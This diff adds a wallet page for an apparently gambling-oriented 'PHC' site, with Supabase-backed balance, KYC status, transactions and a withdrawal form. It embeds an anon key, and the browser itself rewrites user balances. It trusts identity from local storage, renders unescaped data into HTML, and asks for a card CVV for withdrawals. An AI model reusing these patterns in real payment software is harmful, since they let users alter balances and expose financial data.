@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PHC Wallet</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background:#eef2f7; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; color:#1a1a2e; min-height:100vh; }
+        body.dark { background:#0f172a; color:#e2e8f0; }
+        .app { max-width:480px; margin:0 auto; background:#eef2f7; min-height:100vh; padding-bottom:80px; position:relative; }
+        body.dark .app { background:#0f172a; }
+
+        .topbar { background:linear-gradient(135deg, #0d1b4a, #1a237e); color:white; padding:16px 20px; display:flex; align-items:center; justify-content:space-between; position:sticky; top:0; z-index:100; box-shadow:0 2px 10px rgba(0,0,0,0.15); }
+        body.dark .topbar { background:linear-gradient(135deg, #0f172a, #1e293b); border-bottom:1px solid #334155; }
+        .topbar .logo { font-size:18px; font-weight:700; display:flex; align-items:center; gap:12px; color:#ffd700; }
+        .topbar .logo i { cursor:pointer; font-size:18px; color:#ffffff; }
+        .topbar .balance-display { font-size:14px; font-weight:700; background:rgba(255,215,0,0.1); padding:6px 14px; border-radius:20px; display:flex; align-items:center; gap:6px; border:1px solid rgba(255,215,0,0.15); color:#ffd700; }
+        .topbar .balance-display i { font-size:14px; color:#ffd700; }
+
+        .welcome-banner { background:linear-gradient(135deg, #1a237e, #0d47a1); padding:20px 20px 24px; margin:0 0 16px 0; position:relative; overflow:hidden; }
+        body.dark .welcome-banner { background:linear-gradient(135deg, #0f172a, #1e293b); border-bottom:2px solid #f5b342; }
+        .welcome-banner::after { content:''; position:absolute; top:-50%; right:-30%; width:200px; height:200px; background:radial-gradient(circle, rgba(255,255,255,0.05) 0%, transparent 70%); border-radius:50%; }
+        .welcome-banner h1 { font-size:22px; font-weight:800; color:#ffffff; position:relative; z-index:1; }
+        .welcome-banner p { font-size:14px; color:rgba(255,255,255,0.7); position:relative; z-index:1; margin-top:2px; }
+
+        .balance-card { margin:-12px 16px 16px 16px; padding:24px 24px 20px; border-radius:16px; background:linear-gradient(135deg, #1a237e, #283593); color:white; box-shadow:0 8px 30px rgba(26,35,126,0.3); position:relative; z-index:2; }
+        body.dark .balance-card { background:linear-gradient(135deg, #1e293b, #2a3a5a); box-shadow:0 8px 30px rgba(0,0,0,0.4); }
+        .balance-card .balance-title { font-size:12px; font-weight:600; color:rgba(255,255,255,0.6); text-transform:uppercase; letter-spacing:1px; }
+        .balance-card .balance { font-size:40px; font-weight:900; margin:6px 0 12px 0; letter-spacing:0.5px; }
+        .balance-card .balance .currency-symbol { font-size:24px; font-weight:700; color:rgba(255,255,255,0.5); }
+        .balance-card .balance-row { display:flex; gap:12px; margin-top:8px; }
+        .balance-card .balance-item { background:rgba(255,255,255,0.08); padding:8px 14px; border-radius:10px; flex:1; text-align:center; border:1px solid rgba(255,255,255,0.05); }
+        .balance-card .balance-item .label { font-size:9px; font-weight:600; color:rgba(255,255,255,0.4); text-transform:uppercase; letter-spacing:0.5px; }
+        .balance-card .balance-item .value { font-size:14px; font-weight:700; color:#ffffff; margin-top:2px; }
+
+        .kyc-status-bar { margin:0 16px 16px 16px; padding:14px 18px; border-radius:12px; background:#ffffff; border:1px solid #e8ecf1; box-shadow:0 1px 4px rgba(0,0,0,0.04); display:flex; align-items:center; justify-content:space-between; cursor:pointer; transition:0.3s; }
+        body.dark .kyc-status-bar { background:#1e293b; border-color:#334155; box-shadow:none; }
+        .kyc-status-bar:hover { transform:translateY(-2px); box-shadow:0 6px 20px rgba(0,0,0,0.06); }
+        .kyc-status-bar .kyc-left { display:flex; align-items:center; gap:12px; }
+        .kyc-status-bar .kyc-badge { padding:4px 14px; border-radius:20px; font-size:11px; font-weight:700; }
+        .kyc-badge.level-0 { background:#fde8e8; color:#b33a4a; }
+        .kyc-badge.level-1 { background:#e8f1ff; color:#1a237e; }
+        .kyc-badge.level-2 { background:#e6f7e6; color:#1a8a4a; }
+        .kyc-badge.level-3 { background:#fff8e6; color:#b8860b; }
+        .kyc-status-bar .kyc-details .label { font-size:12px; color:#6c757d; }
+        .kyc-status-bar .kyc-details .value { font-size:14px; font-weight:700; color:#212529; }
+        body.dark .kyc-status-bar .kyc-details .value { color:#f8fafc; }
+        .kyc-status-bar .kyc-arrow { color:#6c757d; font-size:16px; }
+
+        .action-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; padding:0 16px; margin-bottom:16px; }
+        .action-card { background:#ffffff; border-radius:12px; padding:18px 12px; text-align:center; cursor:pointer; transition:0.3s; border:1px solid #e8ecf1; box-shadow:0 1px 4px rgba(0,0,0,0.04); }
+        body.dark .action-card { background:#1e293b; border-color:#334155; box-shadow:none; }
+        .action-card:hover { transform:translateY(-3px); box-shadow:0 6px 20px rgba(0,0,0,0.08); border-color:#1a237e; }
+        body.dark .action-card:hover { border-color:#f5b342; box-shadow:0 6px 20px rgba(0,0,0,0.3); }
+        .action-card .icon { font-size:28px; display:block; margin-bottom:6px; }
+        .action-card .icon.deposit-icon { color:#10b981; }
+        .action-card .icon.withdraw-icon { color:#ef4444; }
+        .action-card .name { font-size:13px; font-weight:700; color:#212529; display:block; }
+        body.dark .action-card .name { color:#f8fafc; }
+        .action-card .desc { font-size:9px; color:#6c757d; display:block; margin-top:2px; }
+        body.dark .action-card .desc { color:#94a3b8; }
+
+        .section-title { font-size:16px; font-weight:700; color:#212529; padding:0 16px; margin:4px 0 10px 0; }
+        body.dark .section-title { color:#f8fafc; }
+        .section-title .title-icon { margin-right:6px; }
+
+        .transaction-list { margin:0 16px 16px 16px; background:#ffffff; border-radius:12px; border:1px solid #e8ecf1; box-shadow:0 1px 4px rgba(0,0,0,0.04); overflow:hidden; }
+        body.dark .transaction-list { background:#1e293b; border-color:#334155; box-shadow:none; }
+        .transaction-item { display:flex; justify-content:space-between; align-items:center; padding:14px 16px; border-bottom:1px solid #f0f2f5; }
+        body.dark .transaction-item { border-bottom-color:#334155; }
+        .transaction-item:last-child { border-bottom:none; }
+        .transaction-item .tx-left { display:flex; align-items:center; gap:12px; }
+        .transaction-item .tx-icon { width:40px; height:40px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:16px; flex-shrink:0; }
+        .transaction-item .tx-icon.deposit { background:#e6f7e6; color:#1a8a4a; }
+        .transaction-item .tx-icon.withdraw { background:#fde8e8; color:#b33a4a; }
+        .transaction-item .tx-icon.pending { background:#fff8e6; color:#b8860b; }
+        .transaction-item .tx-icon.completed { background:#e6f7e6; color:#1a8a4a; }
+        body.dark .transaction-item .tx-icon.deposit { background:#1a3a2a; color:#10b981; }
+        body.dark .transaction-item .tx-icon.withdraw { background:#3a1a1a; color:#f87171; }
+        body.dark .transaction-item .tx-icon.pending { background:#3a3a1a; color:#f5b342; }
+        .transaction-item .tx-details .tx-name { font-size:13px; font-weight:600; color:#212529; }
+        body.dark .transaction-item .tx-details .tx-name { color:#f8fafc; }
+        .transaction-item .tx-details .tx-date { font-size:11px; color:#6c757d; margin-top:2px; }
+        body.dark .transaction-item .tx-details .tx-date { color:#94a3b8; }
+        .transaction-item .tx-amount { font-size:15px; font-weight:700; }
+        .transaction-item .tx-amount.positive { color:#1a8a4a; }
+        .transaction-item .tx-amount.negative { color:#b33a4a; }
+        body.dark .transaction-item .tx-amount.positive { color:#10b981; }
+        body.dark .transaction-item .tx-amount.negative { color:#f87171; }
+        .transaction-item .tx-status { font-size:9px; font-weight:700; padding:2px 10px; border-radius:12px; text-transform:uppercase; }
+        .transaction-item .tx-status.completed { background:#e6f7e6; color:#1a8a4a; }
+        .transaction-item .tx-status.pending { background:#fff8e6; color:#b8860b; }
+        .transaction-item .tx-status.failed { background:#fde8e8; color:#b33a4a; }
+        body.dark .transaction-item .tx-status.completed { background:#1a3a2a; color:#10b981; }
+        body.dark .transaction-item .tx-status.pending { background:#3a3a1a; color:#f5b342; }
+        body.dark .transaction-item .tx-status.failed { background:#3a1a1a; color:#f87171; }
+
+        .empty-state { text-align:center; padding:30px 20px; color:#6c757d; }
+        body.dark .empty-state { color:#94a3b8; }
+        .empty-state i { font-size:36px; display:block; margin-bottom:10px; color:#d4dce5; }
+        body.dark .empty-state i { color:#334155; }
+
+        .bottom-nav { position:fixed; bottom:0; left:50%; transform:translateX(-50%); width:100%; max-width:480px; background:#ffffff; display:flex; justify-content:space-around; align-items:center; padding:8px 0 14px 0; box-shadow:0 -2px 15px rgba(0,0,0,0.08); border-top:1px solid #e8ecf1; z-index:200; }
+        body.dark .bottom-nav { background:#0f172a; border-top-color:#1e293b; box-shadow:0 -2px 15px rgba(0,0,0,0.3); }
+        .nav-item { text-align:center; color:#6c757d; font-size:10px; font-weight:600; cursor:pointer; padding:4px 12px; transition:0.2s; border:none; background:transparent; text-decoration:none; }
+        body.dark .nav-item { color:#94a3b8; }
+        .nav-item i { display:block; font-size:20px; margin-bottom:2px; }
+        .nav-item.active { color:#1a237e; }
+        body.dark .nav-item.active { color:#f5b342; }
+        .nav-item:hover:not(.active) { color:#1a237e; }
+        body.dark .nav-item:hover:not(.active) { color:#f8fafc; }
+
+        .toast { position:fixed; bottom:90px; left:50%; transform:translateX(-50%); background:#212529; color:#ffffff; padding:12px 24px; border-radius:8px; font-weight:600; font-size:13px; box-shadow:0 4px 20px rgba(0,0,0,0.2); opacity:0; transition:opacity 0.3s ease; z-index:999; max-width:90%; text-align:center; pointer-events:none; }
+        body.dark .toast { background:#1e293b; }
+        .toast.show { opacity:1; }
+
+        .modal-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); backdrop-filter:blur(4px); z-index:1000; display:none; align-items:center; justify-content:center; }
+        .modal-overlay.active { display:flex; }
+        .modal-content { background:white; border-radius:16px; padding:24px; max-width:400px; width:90%; max-height:90vh; overflow-y:auto; box-shadow:0 20px 60px rgba(0,0,0,0.3); }
+        body.dark .modal-content { background:#1e293b; }
+        .modal-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:16px; }
+        .modal-header h2 { font-size:20px; color:#0a1a2a; }
+        body.dark .modal-header h2 { color:#f8fafc; }
+        .modal-close { font-size:22px; color:#7a8a9a; cursor:pointer; padding:4px; }
+        body.dark .modal-close { color:#94a3b8; }
+        .modal-body label { display:block; font-size:13px; font-weight:600; color:#0a1a2a; margin-top:12px; margin-bottom:4px; }
+        body.dark .modal-body label { color:#f8fafc; }
+        .modal-body input, .modal-body select { width:100%; padding:12px 14px; border:1px solid #dce5f0; border-radius:10px; font-size:14px; background:#f8fafc; transition:0.3s; margin-bottom:4px; box-sizing:border-box; }
+        body.dark .modal-body input, body.dark .modal-body select { background:#2a3a5a; border-color:#334155; color:#f8fafc; }
+        .modal-body input:focus { border-color:#1a237e; outline:none; box-shadow:0 0 0 3px rgba(26,35,126,0.1); }
+        body.dark .modal-body input:focus { border-color:#f5b342; box-shadow:0 0 0 3px rgba(245,179,66,0.1); }
+        .modal-footer { display:flex; gap:12px; margin-top:20px; }
+        .btn-cancel-modal { flex:1; padding:12px; border:1px solid #dce5f0; border-radius:30px; background:white; color:#0a1a2a; font-weight:600; cursor:pointer; }
+        body.dark .btn-cancel-modal { background:#2a3a5a; border-color:#334155; color:#f8fafc; }
+        .btn-confirm-modal { flex:2; padding:12px; border:none; border-radius:30px; background:#1a237e; color:white; font-weight:700; cursor:pointer; transition:0.3s; }
+        .btn-confirm-modal:hover { background:#0d1b4a; }
+        body.dark .btn-confirm-modal { background:#f5b342; color:#0f172a; }
+        body.dark .btn-confirm-modal:hover { background:#e6a832; }
+    </style>
+</head>
+
+<body>
+    <div class="app">
+        <div class="topbar">
+            <div class="logo"><i class="fas fa-arrow-left" onclick="history.back()"></i> 💳 Wallet</div>
+            <div class="balance-display"><i class="fas fa-wallet"></i> <span id="headerBalance">$0.00</span></div>
+        </div>
+
+        <div class="welcome-banner"><h1>My Wallet 💰</h1><p>Manage your funds and track transactions</p></div>
+
+        <div class="balance-card">
+            <div class="balance-title">Available Balance</div>
+            <div class="balance"><span class="currency-symbol">$</span><span id="walletBalance">0.00</span></div>
+            <div class="balance-row">
+                <div class="balance-item"><div class="label">Total Deposits</div><div class="value" id="totalDeposits">$0.00</div></div>
+                <div class="balance-item"><div class="label">Total Withdrawals</div><div class="value" id="totalWithdrawals">$0.00</div></div>
+            </div>
+        </div>
+
+        <div class="kyc-status-bar" onclick="location.href='kyc.html'">
+            <div class="kyc-left">
+                <span class="kyc-badge level-0" id="kycBadge">Level 0</span>
+                <div class="kyc-details">
+                    <div class="label">Verification Status</div>
+                    <div class="value" id="kycStatusText">Unverified</div>
+                </div>
+            </div>
+            <div class="kyc-arrow"><i class="fas fa-chevron-right"></i></div>
+        </div>
+
+        <div class="action-grid">
+            <div class="action-card" onclick="deposit()"><span class="icon deposit-icon">⬇️</span><span class="name">Deposit</span><span class="desc">Add funds to wallet</span></div>
+            <div class="action-card" onclick="openWithdrawModal()"><span class="icon withdraw-icon">⬆️</span><span class="name">Withdraw</span><span class="desc">Request payout</span></div>
+        </div>
+
+        <div class="section-title"><span class="title-icon">📋</span> Recent Transactions</div>
+        <div class="transaction-list" id="transactionList">
+            <div class="empty-state"><i class="fas fa-receipt"></i><p>No transactions yet</p><p style="font-size:12px; margin-top:4px;">Your wallet activity will appear here</p></div>
+        </div>
+
+        <div class="bottom-nav">
+            <div class="nav-item" onclick="location.href='index.html'"><i class="fas fa-home"></i> Home</div>
+            <div class="nav-item" onclick="location.href='bet.html'"><i class="fas fa-gamepad"></i> Games</div>
+            <div class="nav-item" onclick="location.href='history.html'"><i class="fas fa-history"></i> History</div>
+            <div class="nav-item active"><i class="fas fa-wallet"></i> Wallet</div>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal-content">
+            <div class="modal-header"><h2 id="modalTitle">Modal</h2><i class="fas fa-times modal-close" id="modalClose"></i></div>
+            <div class="modal-body" id="modalBody"></div>
+            <div class="modal-footer"><button class="btn-cancel-modal" id="modalCancel">Cancel</button><button class="btn-confirm-modal" id="modalConfirm">Confirm</button></div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast">Message</div>
+
+    <script>
+        // ============================================================
+        // CONFIG
+        // ============================================================
+        const SUPABASE_URL = "https://gcesrhfyupmkrevaqpfr.supabase.co";
+        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdjZXNyaGZ5dXBta3JldmFxcGZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI4MjQ0MjAsImV4cCI6MjA5ODQwMDQyMH0.LarBYjP0Eg4HfFV_x5GVS7K1d4AuRfBWOjo0D1kL2xM";
+
+        // ============================================================
+        // HELPERS
+        // ============================================================
+        function formatCurrency(val) {
+            return val.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+        }
+
+        function showToast(msg, duration) {
+            duration = duration || 3000;
+            var t = document.getElementById('toast');
+            if (!t) return;
+            t.textContent = msg;
+            t.classList.add('show');
+            clearTimeout(t._timer);
+            t._timer = setTimeout(function() { t.classList.remove('show'); }, duration);
+        }
+
+        function getCurrentUser() {
+            var u = JSON.parse(localStorage.getItem('phc_current_user'));
+            if (!u || !u.email) return null;
+            return u;
+        }
+
+        async function querySupabase(table, query = '') {
+            try {
+                const response = await fetch(`${SUPABASE_URL}/rest/v1/${table}${query}`, {
+                    headers: {
+                        'apikey': SUPABASE_ANON_KEY,
+                        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
+                    }
+                });
+                if (!response.ok) return [];
+                return await response.json();
+            } catch (e) {
+                console.error("Supabase Error:", e);
+                return [];
+            }
+        }
+
+        async function patchSupabase(table, query, data) {
+            try {
+                const response = await fetch(`${SUPABASE_URL}/rest/v1/${table}${query}`, {
+                    method: 'PATCH',
+                    headers: {
+                        'apikey': SUPABASE_ANON_KEY,
+                        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+                return response.ok;
+            } catch (e) {
+                console.error("Supabase Patch Error:", e);
+                return false;
+            }
+        }
+
+        async function saveToSupabase(table, data) {
+            try {
+                const response = await fetch(`${SUPABASE_URL}/rest/v1/${table}`, {
+                    method: 'POST',
+                    headers: {
+                        'apikey': SUPABASE_ANON_KEY,
+                        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+                        'Content-Type': 'application/json',
+                        'Prefer': 'return=minimal'
+                    },
+                    body: JSON.stringify(data)
+                });
+                return response.ok;
+            } catch (e) {
+                console.error("Supabase Save Error:", e);
+                return false;
+            }
+        }
+
+        // ============================================================
+        // LOAD WALLET DATA
+        // ============================================================
+        async function loadWallet() {
+            var user = getCurrentUser();
+            if (!user) { window.location.href = 'login.html'; return; }
+
+            // Fetch user data
+            const users = await querySupabase('users', `?email=eq.${user.email}`);
+            if (!users || users.length === 0) {
+                showToast('⚠️ Error fetching user data.');
+                return;
+            }
+            const userData = users[0];
+            const balance = userData.balance || 0;
+            
+            document.getElementById('walletBalance').textContent = formatCurrency(balance);
+            document.getElementById('headerBalance').textContent = '$' + formatCurrency(balance);
+
+            // Update KYC status
+            var kycLevel = userData.kyc_level || 0;
+            var kycStatus = userData.kyc_status || 'unverified';
+            var badge = document.getElementById('kycBadge');
+            badge.className = 'kyc-badge level-' + kycLevel;
+            var levelNames = { 0: 'Level 0', 1: 'Level 1', 2: 'Level 2', 3: 'Level 3' };
+            badge.textContent = levelNames[kycLevel] || 'Level 0';
+            document.getElementById('kycStatusText').textContent = kycStatus.charAt(0).toUpperCase() + kycStatus.slice(1);
+
+            // Fetch transactions
+            const transactions = await querySupabase('transactions', `?user_email=eq.${user.email}&order=created_at.desc`);
+            var totalDeposits = 0, totalWithdrawals = 0;
+            if (transactions) {
+                transactions.forEach(t => {
+                    if (t.amount > 0) totalDeposits += t.amount;
+                    else totalWithdrawals += Math.abs(t.amount);
+                });
+            }
+            document.getElementById('totalDeposits').textContent = '$' + formatCurrency(totalDeposits);
+            document.getElementById('totalWithdrawals').textContent = '$' + formatCurrency(totalWithdrawals);
+            
+            renderTransactions(transactions);
+        }
+
+        function renderTransactions(transactions) {
+            var container = document.getElementById('transactionList');
+            if (!transactions || transactions.length === 0) {
+                container.innerHTML = '<div class="empty-state"><i class="fas fa-receipt"></i><p>No transactions yet</p><p style="font-size:12px; margin-top:4px;">Your wallet activity will appear here</p></div>';
+                return;
+            }
+            var html = '';
+            transactions.slice(0, 10).forEach(t => {
+                var isPositive = t.amount > 0;
+                var icon = isPositive ? 'fa-arrow-down' : 'fa-arrow-up';
+                var iconClass = isPositive ? 'deposit' : 'withdraw';
+                var amountClass = isPositive ? 'positive' : 'negative';
+                var sign = isPositive ? '+' : '';
+                var dateStr = t.created_at ? new Date(t.created_at).toLocaleString() : 'Just now';
+                var status = t.status || 'completed';
+                var statusClass = status.toLowerCase();
+                var name = t.name || 'Transaction';
+                var isDeposit = name.toLowerCase().includes('deposit') || name.toLowerCase().includes('load');
+                var isWithdrawal = name.toLowerCase().includes('withdraw') || name.toLowerCase().includes('payout');
+                if (isDeposit) iconClass = 'deposit'; 
+                else if (isWithdrawal) iconClass = 'withdraw'; 
+                else iconClass = 'pending';
+                html += `
+                    <div class="transaction-item">
+                        <div class="tx-left"><div class="tx-icon ${iconClass}"><i class="fas ${icon}"></i></div>
+                        <div class="tx-details"><div class="tx-name">${name}</div><div class="tx-date">${dateStr}</div></div></div>
+                        <div style="text-align:right;"><div class="tx-amount ${amountClass}">${sign}$${formatCurrency(Math.abs(t.amount))}</div><div class="tx-status ${statusClass}">${status}</div></div>
+                    </div>
+                `;
+            });
+            container.innerHTML = html;
+        }
+
+        function deposit() {
+            window.location.href = 'Load-&-Play.html';
+        }
+
+        // ============================================================
+        // WITHDRAW MODAL
+        // ============================================================
+        function openWithdrawModal() {
+            var user = getCurrentUser();
+            if (!user) { showToast('⚠️ Please login first.'); window.location.href = 'login.html'; return; }
+            
+            var modal = document.getElementById('modalOverlay');
+            var title = document.getElementById('modalTitle');
+            var body = document.getElementById('modalBody');
+            var confirmBtn = document.getElementById('modalConfirm');
+            var cancelBtn = document.getElementById('modalCancel');
+            var closeBtn = document.getElementById('modalClose');
+
+            title.textContent = '💸 Withdraw Funds';
+            body.innerHTML = `
+                <p style="color:#5a7a9a; margin-bottom:12px;">Your withdrawal limit: <strong id="limitDisplay">$1.00</strong></p>
+                <label>Withdrawal Method</label>
+                <select id="withdrawMethod" onchange="toggleWithdrawMethod()" style="width:100%; padding:12px; border:1px solid #dce5f0; border-radius:10px; font-size:14px; background:#f8fafc;">
+                    <option value="bank">Bank Transfer</option>
+                    <option value="card">Credit / Debit Card</option>
+                </select>
+                <div id="bankFields">
+                    <label>Bank Name</label><input type="text" id="withdrawBankName" placeholder="e.g. Chase Bank" />
+                    <label>Account Number</label><input type="text" id="withdrawBankAccount" placeholder="0123456789" />
+                    <label>Routing Number</label><input type="text" id="withdrawBankRouting" placeholder="021000021" />
+                    <label>Account Holder</label><input type="text" id="withdrawBankHolder" placeholder="Account holder name" />
+                </div>
+                <div id="cardFields" style="display:none;">
+                    <label>Card Type</label><select id="withdrawCardType" style="width:100%; padding:12px; border:1px solid #dce5f0; border-radius:10px; font-size:14px; background:#f8fafc;"><option value="Visa">Visa</option><option value="Mastercard">Mastercard</option><option value="Amex">Amex</option><option value="Discover">Discover</option></select>
+                    <label>Card Number</label><input type="text" id="withdrawCardNumber" placeholder="1234 5678 9012 3456" />
+                    <label>Expiry Date</label><input type="text" id="withdrawCardExpiry" placeholder="MM/YY" />
+                    <label>CVV</label><input type="password" id="withdrawCardCvv" placeholder="•••" maxlength="4" />
+                    <label>Card Holder</label><input type="text" id="withdrawCardHolder" placeholder="Card holder name" />
+                </div>
+                <label style="margin-top:12px;">Amount to withdraw</label>
+                <input type="number" id="withdrawAmount" placeholder="0.00" min="1" step="0.01" />
+                <div style="margin-top:6px; font-size:12px; color:#7a8a9a;">Available: <span id="availableBalance">$0.00</span></div>
+            `;
+
+            // Get user balance
+            fetchUserBalance(user.email, function(balance, kycLevel) {
+                document.getElementById('availableBalance').textContent = '$' + formatCurrency(balance);
+                var limit = getWithdrawalLimit(kycLevel);
+                document.getElementById('limitDisplay').textContent = limit === Infinity ? 'Unlimited' : '$' + formatCurrency(limit);
+            });
+
+            confirmBtn.textContent = 'Request Withdrawal';
+            confirmBtn.className = 'btn-confirm-modal';
+
+            var newConfirm = confirmBtn.cloneNode(true);
+            confirmBtn.parentNode.replaceChild(newConfirm, confirmBtn);
+
+            function closeModal() { modal.classList.remove('active'); }
+            cancelBtn.onclick = closeModal; 
+            closeBtn.onclick = closeModal;
+            modal.onclick = function(e) { if (e.target === modal) closeModal(); };
+
+            newConfirm.addEventListener('click', async function() {
+                var method = document.getElementById('withdrawMethod').value;
+                var amt = parseFloat(document.getElementById('withdrawAmount').value);
+                if (!amt || amt <= 0) { showToast('⚠️ Enter a valid amount.'); return; }
+
+                // Get current balance
+                const users = await querySupabase('users', `?email=eq.${user.email}`);
+                if (!users || users.length === 0) { showToast('⚠️ Error fetching user data.'); return; }
+                const userData = users[0];
+                const balance = userData.balance || 0;
+                const kycLevel = userData.kyc_level || 0;
+                const limit = getWithdrawalLimit(kycLevel);
+
+                if (amt > balance) { showToast('⚠️ Insufficient balance.'); return; }
+                if (limit === 0) { showToast('⚠️ Complete KYC Level 1 to withdraw.'); return; }
+                if (amt > limit) { showToast(`⚠️ Your limit is $${formatCurrency(limit)}. Upgrade KYC.`); return; }
+
+                var details = {};
+                if (method === 'bank') {
+                    var bankName = document.getElementById('withdrawBankName').value.trim();
+                    var account = document.getElementById('withdrawBankAccount').value.trim();
+                    var routing = document.getElementById('withdrawBankRouting').value.trim();
+                    var holder = document.getElementById('withdrawBankHolder').value.trim();
+                    if (!bankName || !account || !routing || !holder) { showToast('⚠️ Fill all bank details.'); return; }
+                    details = { method: 'Bank Transfer', bankName: bankName, account: account, routing: routing, holder: holder };
+                } else {
+                    var cardType = document.getElementById('withdrawCardType').value;
+                    var number = document.getElementById('withdrawCardNumber').value.trim().replace(/\s/g, '');
+                    var expiry = document.getElementById('withdrawCardExpiry').value.trim();
+                    var cvv = document.getElementById('withdrawCardCvv').value.trim();
+                    var holder = document.getElementById('withdrawCardHolder').value.trim();
+                    if (!number || !expiry || !cvv || !holder) { showToast('⚠️ Fill all card details.'); return; }
+                    if (number.length < 15) { showToast('⚠️ Invalid card number.'); return; }
+                    details = { method: 'Card Transfer', cardType: cardType, last4: number.slice(-4), expiry: expiry, cvv: cvv, holder: holder };
+                }
+
+                var newBalance = balance - amt;
+                var updated = await patchSupabase('users', `?email=eq.${user.email}`, { balance: newBalance });
+                if (!updated) { showToast('❌ Error processing withdrawal.'); return; }
+
+                await saveToSupabase('withdrawals', {
+                    user_email: user.email,
+                    user_name: user.firstName + ' ' + user.lastName,
+                    amount: amt,
+                    method: details.method,
+                    bank_name: details.bankName || details.cardType,
+                    account: details.account || details.last4,
+                    status: 'pending'
+                });
+                await saveToSupabase('transactions', {
+                    user_email: user.email,
+                    name: '💸 Withdrawal - $' + formatCurrency(amt) + ' (' + details.method + ')',
+                    amount: -amt
+                });
+                showToast('✅ Withdrawal of $' + formatCurrency(amt) + ' submitted!');
+                
+                // Update local user
+                var localUser = JSON.parse(localStorage.getItem('phc_current_user'));
+                if (localUser) {
+                    localUser.balance = newBalance;
+                    localStorage.setItem('phc_current_user', JSON.stringify(localUser));
+                }
+                
+                closeModal();
+                loadWallet();
+            });
+            modal.classList.add('active');
+        }
+
+        async function fetchUserBalance(email, callback) {
+            const users = await querySupabase('users', `?email=eq.${email}`);
+            if (users && users.length > 0) {
+                callback(users[0].balance || 0, users[0].kyc_level || 0);
+            } else {
+                callback(0, 0);
+            }
+        }
+
+        function getWithdrawalLimit(kycLevel) {
+            const limits = { 0: 0, 1: 1.00, 2: 500.00, 3: Infinity };
+            return limits[kycLevel] || 0;
+        }
+
+        window.toggleWithdrawMethod = function() {
+            var method = document.getElementById('withdrawMethod').value;
+            document.getElementById('bankFields').style.display = method === 'bank' ? 'block' : 'none';
+            document.getElementById('cardFields').style.display = method === 'card' ? 'block' : 'none';
+        };
+
+        // ============================================================
+        // DARK MODE
+        // ============================================================
+        (function() {
+            if (localStorage.getItem("phc_dark_mode") === "true") {
+                document.body.classList.add("dark");
+            }
+        })();
+
+        // ============================================================
+        // INIT
+        // ============================================================
+        document.addEventListener('DOMContentLoaded', loadWallet);
+        console.log('💳 Wallet loaded with real Supabase data!');
+    </script>
+
+</body>
